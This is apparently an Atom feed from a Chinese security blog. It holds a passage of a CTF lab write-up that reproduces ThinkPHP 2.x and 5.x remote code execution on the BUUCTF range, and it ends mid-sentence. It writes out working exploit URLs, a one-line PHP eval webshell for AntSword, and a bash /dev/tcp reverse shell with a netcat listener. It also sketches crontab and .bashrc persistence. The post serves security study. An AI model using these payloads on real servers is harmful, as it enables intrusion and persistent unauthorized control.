<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://bae-ace.github.io</id>
    <title>bae的博客 • Posts by &#34;漏洞分析&#34; category</title>
    <link href="https://bae-ace.github.io" />
    <updated>2025-07-28T06:18:44.000Z</updated>
    <category term="工具" />
    <category term="sqlmap" />
    <category term="渗透测试" />
    <category term="PWN" />
    <category term="ELF" />
    <category term="ROP" />
    <category term="CTF" />
    <category term="二进制安全" />
    <category term="Web安全" />
    <category term="SQL注入" />
    <category term="网络安全" />
    <category term="Struts2" />
    <category term="RCE" />
    <category term="漏洞复现" />
    <category term="OGNL注入" />
    <category term="ThinkPHP" />
    <category term="hexo" />
    <category term="博客搭建" />
    <category term="初始测试" />
    <category term="linux" />
    <category term="命令" />
    <category term="命令执行" />
    <category term="漏洞利用" />
    <category term="信息收集" />
    <category term="子域名" />
    <entry>
        <id>https://bae-ace.github.io/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/</id>
        <title>ThinkPHP 2.x &amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/"/>
        <content type="html">&lt;h1 id=&#34;ThinkPHP-2-x-5-x-远程代码执行漏洞复现与利用（基于-BUUCTF）&#34;&gt;&lt;a href=&#34;#ThinkPHP-2-x-5-x-远程代码执行漏洞复现与利用（基于-BUUCTF）&#34; class=&#34;headerlink&#34; title=&#34;ThinkPHP 2.x &amp;amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）&#34;&gt;&lt;/a&gt;ThinkPHP 2.x &amp;amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）&lt;/h1&gt;&lt;h2 id=&#34;一、前言&#34;&gt;&lt;a href=&#34;#一、前言&#34; class=&#34;headerlink&#34; title=&#34;一、前言&#34;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;ThinkPHP 是一个广受欢迎的 PHP 开发框架，但其早期版本（2.x 和 5.0.x 至 5.0.23）因设计缺陷存在严重的&lt;strong&gt;远程代码执行（RCE）漏洞&lt;/strong&gt;。这些漏洞允许攻击者通过精心构造的 URL 参数执行任意 PHP 代码或系统命令，甚至实现服务器完全控制。本文基于 &lt;strong&gt;BUUCTF&lt;/strong&gt; 在线靶场，详细复现 ThinkPHP 2.x 和 5.x 的 RCE 漏洞，涵盖漏洞原理、利用过程、蚁剑连接以及后门植入的可能性，旨在帮助安全从业者和开发者深入理解和防范此类漏洞。&lt;/p&gt;
&lt;p&gt;本文将分为两部分：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 2.x RCE 漏洞&lt;/strong&gt;：利用模板变量解析缺陷执行代码和命令。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 5.x RCE 漏洞&lt;/strong&gt;：通过框架路由调用任意函数实现代码执行。&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;二、ThinkPHP-2-x-RCE-漏洞复现&#34;&gt;&lt;a href=&#34;#二、ThinkPHP-2-x-RCE-漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;二、ThinkPHP 2.x RCE 漏洞复现&#34;&gt;&lt;/a&gt;二、ThinkPHP 2.x RCE 漏洞复现&lt;/h2&gt;&lt;h3 id=&#34;1-靶场环境&#34;&gt;&lt;a href=&#34;#1-靶场环境&#34; class=&#34;headerlink&#34; title=&#34;1. 靶场环境&#34;&gt;&lt;/a&gt;1. 靶场环境&lt;/h3&gt;&lt;p&gt;BUUCTF 提供在线靶场，无需自行搭建环境。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 2.x RCE 漏洞地址&lt;/strong&gt;：&lt;code&gt;https://buuoj.cn/challenges#[ThinkPHP]2-Rce&lt;/code&gt;&lt;br&gt;开启靶场，访问页面后，通常显示简陋的 ThinkPHP 2.x 欢迎页面，但后台隐藏着强大的远程命令执行能力 。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-漏洞原理&#34;&gt;&lt;a href=&#34;#2-漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;2. 漏洞原理&#34;&gt;&lt;/a&gt;2. 漏洞原理&lt;/h3&gt;&lt;p&gt;ThinkPHP 2.x 的模板引擎在处理 URL 参数时，直接将参数拼接为模板变量，未进行严格过滤。例如，URL 参数 &lt;code&gt;name=$&amp;#123;@phpinfo()&amp;#125;&lt;/code&gt; 会被解析为：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; $&amp;#123;@&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;phpinfo&lt;/span&gt;()&amp;#125; &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;由于 &lt;code&gt;@phpinfo()&lt;/code&gt; 是合法的 PHP 函数调用，服务器会执行 &lt;code&gt;phpinfo()&lt;/code&gt; 函数并返回结果。如果结合 &lt;code&gt;eval()&lt;/code&gt; 或 &lt;code&gt;assert()&lt;/code&gt;，攻击者可通过 GET 或 POST 参数进一步执行任意代码或系统命令，形成完全控制。&lt;/p&gt;
&lt;h3 id=&#34;3-漏洞利用过程&#34;&gt;&lt;a href=&#34;#3-漏洞利用过程&#34; class=&#34;headerlink&#34; title=&#34;3. 漏洞利用过程&#34;&gt;&lt;/a&gt;3. 漏洞利用过程&lt;/h3&gt;&lt;h4 id=&#34;步骤-1：测试代码执行（POC1）&#34;&gt;&lt;a href=&#34;#步骤-1：测试代码执行（POC1）&#34; class=&#34;headerlink&#34; title=&#34;步骤 1：测试代码执行（POC1）&#34;&gt;&lt;/a&gt;步骤 1：测试代码执行（POC1）&lt;/h4&gt;&lt;p&gt;使用以下 Payload 测试是否可以执行 PHP 代码：&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ruby&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;http:&lt;/span&gt;/&lt;span class=&#34;hljs-regexp&#34;&gt;/node3.buuoj.cn:26104/&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;?s&lt;/span&gt;=&lt;span class=&#34;hljs-regexp&#34;&gt;/index/index&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/name/&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;@phpinfo&lt;/span&gt;()&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回 &lt;code&gt;phpinfo()&lt;/code&gt; 的详细信息，证明代码被成功解析执行 。&lt;/p&gt;
&lt;h4 id=&#34;步骤-2：执行系统命令（POC2）&#34;&gt;&lt;a href=&#34;#步骤-2：执行系统命令（POC2）&#34; class=&#34;headerlink&#34; title=&#34;步骤 2：执行系统命令（POC2）&#34;&gt;&lt;/a&gt;步骤 2：执行系统命令（POC2）&lt;/h4&gt;&lt;p&gt;利用 &lt;code&gt;eval()&lt;/code&gt; 结合 GET 参数执行系统命令（如 &lt;code&gt;ls&lt;/code&gt;）：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;1&lt;/span&gt;])&amp;#125;&amp;amp;1=system(%27ls%27);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;参数说明&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;name=$&amp;#123;@eval($_GET[1])&amp;#125;&lt;/code&gt;：通过 &lt;code&gt;eval()&lt;/code&gt; 执行 GET 参数 &lt;code&gt;1&lt;/code&gt; 的内容。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1=system(%27ls%27)&lt;/code&gt;：执行 &lt;code&gt;system(&amp;#39;ls&amp;#39;)&lt;/code&gt;，其中 &lt;code&gt;%27&lt;/code&gt; 是 URL 编码的单引号 &lt;code&gt;&amp;#39;&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回目录列表，例如：&lt;figure class=&#34;highlight axapta&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs axapta&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;index&lt;/span&gt;.php&lt;br&gt;flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
说明 &lt;code&gt;ls&lt;/code&gt; 命令执行成功。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;步骤-3：读取-Flag-文件&#34;&gt;&lt;a href=&#34;#步骤-3：读取-Flag-文件&#34; class=&#34;headerlink&#34; title=&#34;步骤 3：读取 Flag 文件&#34;&gt;&lt;/a&gt;步骤 3：读取 Flag 文件&lt;/h4&gt;&lt;p&gt;尝试读取 &lt;code&gt;/flag&lt;/code&gt; 文件内容：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;1&lt;/span&gt;])&amp;#125;&amp;amp;1=system(%27cat%20flag%27);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回类似以下内容：&lt;/p&gt;
&lt;figure class=&#34;highlight dust&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dust&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;hljs-template-variable&#34;&gt;&amp;#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这表明目标服务器已被完全控制 。&lt;/p&gt;
&lt;h3 id=&#34;4-使用蚁剑连接&#34;&gt;&lt;a href=&#34;#4-使用蚁剑连接&#34; class=&#34;headerlink&#34; title=&#34;4. 使用蚁剑连接&#34;&gt;&lt;/a&gt;4. 使用蚁剑连接&lt;/h3&gt;&lt;p&gt;为了更方便地操作服务器，可以上传一句话木马并使用蚁剑（AntSword）进行交互。&lt;/p&gt;
&lt;h4 id=&#34;构造-Payload：&#34;&gt;&lt;a href=&#34;#构造-Payload：&#34; class=&#34;headerlink&#34; title=&#34;构造 Payload：&#34;&gt;&lt;/a&gt;构造 Payload：&lt;/h4&gt;&lt;p&gt;使用 POST 参数构造一句话木马：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;1&lt;/span&gt;])&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;蚁剑配置&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;URL&lt;/strong&gt;：&lt;code&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_POST[1])&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;密码&lt;/strong&gt;：&lt;code&gt;1&lt;/code&gt;（对应 &lt;code&gt;$_POST[1]&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：PHP（原生）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;编码&lt;/strong&gt;：默认&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;连接成功后，可使用蚁剑进行：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;命令行执行&lt;/li&gt;
&lt;li&gt;文件管理（如上传、下载）&lt;/li&gt;
&lt;li&gt;终端交互&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-进一步操作&#34;&gt;&lt;a href=&#34;#5-进一步操作&#34; class=&#34;headerlink&#34; title=&#34;5. 进一步操作&#34;&gt;&lt;/a&gt;5. 进一步操作&lt;/h3&gt;&lt;p&gt;在真实环境中，可进行以下高级操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;上传 WebShell&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;在蚁剑中上传一句话木马（如 &lt;code&gt;&amp;lt;?php @eval($_POST[&amp;#39;pass&amp;#39;]);?&amp;gt;&lt;/code&gt;）或冰蝎（Behinder）木马。&lt;/li&gt;
&lt;li&gt;保存到可访问路径（如 &lt;code&gt;/var/www/html/shell.php&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;反弹 Shell&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;在 Kali 上启动监听：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;nc -lvnp 4444&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;在蚁剑中执行：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/你的IP/4444 0&amp;gt;&amp;amp;1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;持久化后门&lt;/strong&gt;：&lt;ul&gt;
&lt;li&gt;添加计划任务（crontab）定时反弹 Shell。&lt;/li&gt;
&lt;li&gt;修改 &lt;code&gt;.bashrc&lt;/code&gt; 文件，添加后门命令。&lt;/li&gt;
&lt;li&gt;写入定时任务（如每分钟执行反弹 Shell）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;三、ThinkPHP-5-x-RCE-漏洞复现&#34;&gt;&lt;a href=&#34;#三、ThinkPHP-5-x-RCE-漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;三、ThinkPHP 5.x RCE 漏洞复现&#34;&gt;&lt;/a&gt;三、ThinkPHP 5.x RCE 漏洞复现&lt;/h2&gt;&lt;h3 id=&#34;1-靶场环境-1&#34;&gt;&lt;a href=&#34;#1-靶场环境-1&#34; class=&#34;headerlink&#34; title=&#34;1. 靶场环境&#34;&gt;&lt;/a&gt;1. 靶场环境&lt;/h3&gt;&lt;p&gt;BUUCTF 提供 ThinkPHP 5.x 在线靶场：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 5.x RCE 漏洞地址&lt;/strong&gt;：&lt;code&gt;https://buuoj.cn/challenges#[ThinkPHP]5-Rce&lt;/code&gt;&lt;br&gt;开启靶场，访问页面显示：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight armasm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs armasm&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;ThinkPHP&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;V5&lt;/span&gt;&lt;br&gt;十年磨一剑 - 为 API 开发设计的高性能框架&lt;br&gt;[ &lt;span class=&#34;hljs-built_in&#34;&gt;V5&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; 版本由 七牛云 独家赞助发布 ]&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这表明靶场运行 ThinkPHP 5.x（版本 &amp;lt;&amp;#x3D; 5.0.23），漏洞复现环境已就绪 。&lt;/p&gt;
&lt;h3 id=&#34;2-漏洞原理-1&#34;&gt;&lt;a href=&#34;#2-漏洞原理-1&#34; class=&#34;headerlink&#34; title=&#34;2. 漏洞原理&#34;&gt;&lt;/a&gt;2. 漏洞原理&lt;/h3&gt;&lt;p&gt;ThinkPHP 5.x 的 RCE 漏洞源于框架对 &lt;code&gt;\think\app::invokefunction&lt;/code&gt; 方法的未授权访问。攻击者可通过 URL 参数调用 &lt;code&gt;call_user_func_array&lt;/code&gt; 函数，动态执行任意 PHP 函数（如 &lt;code&gt;phpinfo&lt;/code&gt;、&lt;code&gt;system&lt;/code&gt;），并传递参数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用链&lt;/strong&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight sas&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sas&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;index&lt;/span&gt;.php&lt;br&gt;└── ?s=&lt;span class=&#34;hljs-keyword&#34;&gt;index&lt;/span&gt;/\think\app/invokefunction&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;function&lt;/span&gt;=call_user_func_array&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;vars&lt;/span&gt;[0]=phpinfo&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;vars&lt;/span&gt;[1][]=-1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;参数说明&lt;/strong&gt;：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;含义说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;s&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;ThinkPHP 路由，访问框架核心类&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;function&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;被调用的函数（如 &lt;code&gt;call_user_func_array&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;vars[0]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;实际调用的函数名称（如 &lt;code&gt;phpinfo&lt;/code&gt;、&lt;code&gt;system&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;vars[1][]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;函数参数数组（如 &lt;code&gt;whoami&lt;/code&gt;、&lt;code&gt;-1&lt;/code&gt;）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;3-漏洞利用过程-1&#34;&gt;&lt;a href=&#34;#3-漏洞利用过程-1&#34; class=&#34;headerlink&#34; title=&#34;3. 漏洞利用过程&#34;&gt;&lt;/a&gt;3. 漏洞利用过程&lt;/h3&gt;&lt;h4 id=&#34;步骤-1：信息探测（测试-phpinfo）&#34;&gt;&lt;a href=&#34;#步骤-1：信息探测（测试-phpinfo）&#34; class=&#34;headerlink&#34; title=&#34;步骤 1：信息探测（测试 phpinfo）&#34;&gt;&lt;/a&gt;步骤 1：信息探测（测试 &lt;code&gt;phpinfo&lt;/code&gt;）&lt;/h4&gt;&lt;p&gt;构造 Payload 测试漏洞：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=phpinfo&amp;amp;vars[1][]=-1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回完整的 &lt;code&gt;phpinfo()&lt;/code&gt; 信息，证明漏洞存在且可利用。&lt;/p&gt;
&lt;h4 id=&#34;步骤-2：执行系统命令（whoami）&#34;&gt;&lt;a href=&#34;#步骤-2：执行系统命令（whoami）&#34; class=&#34;headerlink&#34; title=&#34;步骤 2：执行系统命令（whoami）&#34;&gt;&lt;/a&gt;步骤 2：执行系统命令（&lt;code&gt;whoami&lt;/code&gt;）&lt;/h4&gt;&lt;p&gt;修改 Payload 执行 &lt;code&gt;whoami&lt;/code&gt; 命令：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=system&amp;amp;vars[1][]=whoami&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回：&lt;/p&gt;
&lt;figure class=&#34;highlight haskell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;表明 Web 服务以 &lt;code&gt;www-data&lt;/code&gt; 用户运行，命令执行成功。&lt;/p&gt;
&lt;h4 id=&#34;步骤-3：读取-Flag-文件-1&#34;&gt;&lt;a href=&#34;#步骤-3：读取-Flag-文件-1&#34; class=&#34;headerlink&#34; title=&#34;步骤 3：读取 Flag 文件&#34;&gt;&lt;/a&gt;步骤 3：读取 Flag 文件&lt;/h4&gt;&lt;p&gt;尝试读取 &lt;code&gt;/flag&lt;/code&gt; 或根目录下的 &lt;code&gt;flag&lt;/code&gt; 文件：&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=system&amp;amp;vars[1][]=cat+/flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;或：&lt;/p&gt;
